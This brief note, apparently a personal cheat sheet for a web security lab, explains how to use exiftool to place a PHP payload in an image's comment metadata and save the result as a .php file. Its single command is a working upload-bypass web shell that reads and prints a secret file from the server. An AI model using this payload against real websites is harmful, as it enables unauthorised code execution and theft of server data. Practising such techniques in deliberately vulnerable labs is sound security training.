EXIFTOOL

-comment=”<payload>”

-o to copy the data into a new file such as a php file

exiftool -comment="<?php echo ' LOOK HERE FOR COOL SHIT ' . file_get_contents('/home/carlos/secret') . ' TO THE LEFT' ; ?>" tester.png -o webshell.php